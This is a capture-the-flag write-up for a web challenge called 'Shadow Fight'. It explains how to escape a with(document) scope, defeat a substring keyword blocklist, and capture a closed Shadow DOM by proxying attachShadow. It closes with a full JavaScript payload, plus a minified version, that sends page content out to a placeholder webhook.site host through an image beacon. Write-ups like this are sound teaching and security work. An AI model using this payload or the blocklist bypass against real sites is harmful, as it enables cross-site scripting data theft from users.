# Shadow Fight

## Description
A challenge involving a bot that visits a URL. The goal is to exfiltrate the flag from a closed Shadow DOM.

## Solution
1.  **Indirect eval() to break `with(document)` scope:**
    `(0,eval)('eval(avatar.slice(24))')` evaluates the string in the global scope, bypassing the `with(document)` wrapper that would obscure global variables. This allows access to the `avatar` URL string containing the payload.

2.  **Bypassing keyword blocklist:**
    The JS payload must pass `isSafe()`. Blocked words like `document`, `eval`, `function` are bypassed using string concatenation:
    -   `document` -> `self['doc'+'ument']`
    -   `prototype` -> `Element['proto'+'type']`
    -   `Function` -> `(()=>{}).constructor` (or blocked)
    The check `isSafe()` looks for substrings, but `'doc'+'ument'` in the source code doesn't contain the contiguous substring "document".

3.  **Extracting the closed Shadow DOM — the Proxy trick:**
    A closed Shadow DOM means `element.shadowRoot` returns null. The only way to get a reference is to intercept it at creation time.
    -   **Monkey-patch `attachShadow`:** Wrap it in a `Proxy` that intercepts all calls and saves the return value. We use `Proxy` + `Reflect.apply` to avoid using the word "function".
    -   **Re-execute the script:** Find the `<script>` tag containing the shadow DOM creation IIFE and re-evaluate its text content. The IIFE runs again, calls our intercepted `attachShadow`, and we capture the reference.
    -   **Read the captured root:** Use the captured reference to read `innerHTML` (which works even for closed roots if you have the reference) and exfiltrate the flag.

## Flag
`p_ctf{THE_FLAG}` (Note: Placeholder in writeup, actual flag extracted during exploit)

## Exploitation Payload (JavaScript)

```javascript
/* 
   Inject this into the avatar URL parameter.
   Format: (0,eval)('...') 
   
   The payload must be concise and URL-encoded.
*/

const payload = `
// 1. Monkey-patch attachShadow using Proxy to avoid "function" keyword
// We use Reflect.apply to handle 'this' context correctly
const proxyHandler = {
    apply: (target, thisArg, argumentsList) => {
        const shadowRoot = Reflect.apply(target, thisArg, argumentsList);
        
        // 2. Exfiltrate immediately or store
        // Since we are re-executing the script, this will run when the secret script calls attachShadow
        // We can access shadowRoot.innerHTML
        
        // Use a timeout to ensure innerHTML is populated (it might differ in timing)
        // Or setter hook? 
        // Simpler: Just read it. Validated challenges usually populate immediately or in same tick.
        
        // Exfiltration
        // fetch('https://webhook.site/...?flag=' + encodeURIComponent(shadowRoot.innerHTML));
        // Image beacon if fetch is blocked
        new Image().src = 'https://webhook.site/YOUR_UUID/?flag=' + encodeURIComponent(shadowRoot.innerHTML);
        
        return shadowRoot;
    }
};

// Target: Element.prototype.attachShadow
Element.prototype.attachShadow = new Proxy(Element.prototype.attachShadow, proxyHandler);

// 3. Re-execute the specific script containing "secret"
// Find the script tag
const scripts = document.getElementsByTagName('script');
for (let s of scripts) {
    if (s.text.includes('secret')) {
        // Re-evaluate to trigger the attachShadow call again
        (0,eval)(s.text);
    }
}
`;

// Minified for URL usage:
// (0,eval)('Element.prototype.attachShadow=new Proxy(Element.prototype.attachShadow,{apply:(t,a,r)=>{let s=Reflect.apply(t,a,r);new Image().src="WEBHOOK?"+s.innerHTML;return s}});for(let s of document.scripts)if(s.text.includes("secret"))(0,eval)(s.text)')

```

